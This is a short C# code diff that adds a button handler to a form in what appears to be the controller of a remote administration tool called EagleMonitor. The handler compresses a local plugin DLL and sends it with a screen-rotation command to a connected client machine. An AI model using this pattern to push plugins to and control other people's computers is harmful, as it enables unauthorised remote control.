@@ -122,6 +122,13 @@ namespace EagleMonitor.Forms
             clientHandler.SendPacket(miscellaneousPacket);
         }
 
+        private void rotateScreenGuna2Button_Click(object sender, EventArgs e)
+        {
+            ScreenRotationPacket screenRotationPacket = new ScreenRotationPacket(degreesGuna2ComboBox.Text);
+            screenRotationPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
+            clientHandler.SendPacket(screenRotationPacket);
+        }
+
         private void closeButton_Click(object sender, EventArgs e)
         {
             this.Close();
